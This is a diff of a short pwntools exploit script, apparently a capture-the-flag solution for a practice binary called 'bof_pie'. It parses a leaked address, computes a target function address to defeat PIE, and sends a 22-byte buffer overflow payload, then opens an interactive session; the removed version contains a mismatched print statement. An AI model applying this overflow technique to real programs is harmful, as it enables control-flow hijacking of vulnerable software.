@@ -1,21 +1,11 @@
 Shellcode
 ________________________________________
 from pwn import *
-welcome_offset = 0x00000909
-flag_offset = 0x00000890
 p = process("./bof_pie")
-p.recvuntil("j0n9hyun is ")
-welcome_addr = int(p.recv(10),16)
-
-print str(welcome_addr)
-
-base_addr = welcome_addr-welcome_offset
-flag_addr = base_addr+flag_offset
-
-print("base_addr"+hex(base_addr)
-print "flag addr" +hex(flag_addr)
-
-payload = "a"*22
-payload += p32(flag_addr)
+p.recvuntil("Hello, Do you know j0n9hyun?")
+p.recvuntil("j0n9hyun is")
+w_addr = int(p.recv(10),16)
+j_addr = w_addr-0x79
+payload=b'A'*22 + p32(j_addr)
 p.sendline(payload)
 p.interactive()
